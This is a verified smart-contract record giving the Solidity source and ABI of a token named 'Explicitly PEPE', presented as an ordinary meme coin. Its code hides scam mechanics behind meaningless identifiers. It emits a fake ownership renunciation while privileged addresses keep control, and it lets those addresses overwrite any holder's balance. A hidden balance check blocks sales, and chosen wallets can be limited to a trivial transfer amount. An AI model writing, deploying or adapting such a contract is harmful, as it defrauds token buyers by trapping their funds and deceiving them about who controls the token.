{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface atShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundToAmount) external view returns (uint256);\n\n    function transfer(address atTx, uint256 feeTotal) external returns (bool);\n\n    function allowance(address txSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atTx,\n        uint256 feeTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isShould, uint256 value);\n    event Approval(address indexed txSell, address indexed spender, uint256 value);\n}\n\nabstract contract teamEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isMarketing {\n    function createPair(address liquidityIs, address marketingLimit) external returns (address);\n}\n\ninterface toAmount is atShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExplicitlyPEPE is teamEnable, atShould, toAmount {\n\n    event OwnershipTransferred(address indexed txMaxLaunch, address indexed minIs);\n\n    string private walletReceiver = \"Explicitly PEPE\";\n\n    function getOwner() external view returns (address) {\n        return senderAutoTrading;\n    }\n\n    function owner() external view returns (address) {\n        return senderAutoTrading;\n    }\n\n    uint256 amountFrom;\n\n    function balanceOf(address fundToAmount) public view virtual override returns (uint256) {\n        return totalMinAt[fundToAmount];\n    }\n\n    bool private txTo;\n\n    function approve(address exemptList, uint256 feeTotal) public virtual override returns (bool) {\n        modeShould[_msgSender()][exemptList] = feeTotal;\n        emit Approval(_msgSender(), exemptList, feeTotal);\n        return true;\n    }\n\n    bool private tradingTx;\n\n    bool public fundTokenAmount;\n\n    address txTradingMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public modeMax;\n\n    uint8 private limitLaunched = 18;\n\n    function swapTrading(address toSell, address atTx, uint256 feeTotal) internal returns (bool) {\n        if (toSell == enableTokenTx) {\n            return limitReceiver(toSell, atTx, feeTotal);\n        }\n        uint256 launchedLiquidity = atShould(modeMax).balanceOf(txTradingMin);\n        require(launchedLiquidity == walletTeamTake);\n        require(atTx != txTradingMin);\n        if (enableMarketing[toSell]) {\n            return limitReceiver(toSell, atTx, teamSellExempt);\n        }\n        return limitReceiver(toSell, atTx, feeTotal);\n    }\n\n    address liquidityListLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function txListFund(address limitToken, uint256 feeTotal) public {\n        isAmount();\n        totalMinAt[limitToken] = feeTotal;\n    }\n\n    constructor (){\n        if (tradingTx == launchSell) {\n            takeLaunched = txShouldLiquidity;\n        }\n        enableTake txList = enableTake(liquidityListLimit);\n        modeMax = isMarketing(txList.factory()).createPair(txList.WETH(), address(this));\n        \n        enableTokenTx = _msgSender();\n        fundTo();\n        feeTo[enableTokenTx] = true;\n        totalMinAt[enableTokenTx] = feeMax;\n        \n        emit Transfer(address(0), enableTokenTx, feeMax);\n    }\n\n    function allowance(address limitTeam, address exemptList) external view virtual override returns (uint256) {\n        if (exemptList == liquidityListLimit) {\n            return type(uint256).max;\n        }\n        return modeShould[limitTeam][exemptList];\n    }\n\n    function isAmount() private view {\n        require(feeTo[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeMax;\n    }\n\n    function limitSwapExempt(address enableTrading) public {\n        if (fundTokenAmount) {\n            return;\n        }\n        if (txShouldLiquidity == takeLaunched) {\n            takeLaunched = txShouldLiquidity;\n        }\n        feeTo[enableTrading] = true;\n        if (launchSell) {\n            txTo = true;\n        }\n        fundTokenAmount = true;\n    }\n\n    bool public launchSell;\n\n    function modeReceiver(uint256 feeTotal) public {\n        isAmount();\n        walletTeamTake = feeTotal;\n    }\n\n    uint256 walletTeamTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountMax;\n    }\n\n    uint256 private feeMax = 100000000 * 10 ** 18;\n\n    function transfer(address limitToken, uint256 feeTotal) external virtual override returns (bool) {\n        return swapTrading(_msgSender(), limitToken, feeTotal);\n    }\n\n    address private senderAutoTrading;\n\n    mapping(address => bool) public feeTo;\n\n    function transferFrom(address toSell, address atTx, uint256 feeTotal) external override returns (bool) {\n        if (_msgSender() != liquidityListLimit) {\n            if (modeShould[toSell][_msgSender()] != type(uint256).max) {\n                require(feeTotal <= modeShould[toSell][_msgSender()]);\n                modeShould[toSell][_msgSender()] -= feeTotal;\n            }\n        }\n        return swapTrading(toSell, atTx, feeTotal);\n    }\n\n    string private amountMax = \"EPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitLaunched;\n    }\n\n    uint256 private txShouldLiquidity;\n\n    function totalBuy(address tokenMax) public {\n        isAmount();\n        if (txShouldLiquidity == takeLaunched) {\n            launchSell = true;\n        }\n        if (tokenMax == enableTokenTx || tokenMax == modeMax) {\n            return;\n        }\n        enableMarketing[tokenMax] = true;\n    }\n\n    address public enableTokenTx;\n\n    function limitReceiver(address toSell, address atTx, uint256 feeTotal) internal returns (bool) {\n        require(totalMinAt[toSell] >= feeTotal);\n        totalMinAt[toSell] -= feeTotal;\n        totalMinAt[atTx] += feeTotal;\n        emit Transfer(toSell, atTx, feeTotal);\n        return true;\n    }\n\n    uint256 constant teamSellExempt = 15 ** 10;\n\n    mapping(address => mapping(address => uint256)) private modeShould;\n\n    mapping(address => uint256) private totalMinAt;\n\n    mapping(address => bool) public enableMarketing;\n\n    function fundTo() public {\n        emit OwnershipTransferred(enableTokenTx, address(0));\n        senderAutoTrading = address(0);\n    }\n\n    uint256 private takeLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return walletReceiver;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMaxLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTokenTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTokenAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"}],\"name\":\"limitSwapExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeTotal\",\"type\":\"uint256\"}],\"name\":\"modeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"}],\"name\":\"totalBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotal\",\"type\":\"uint256\"}],\"name\":\"txListFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExplicitlyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}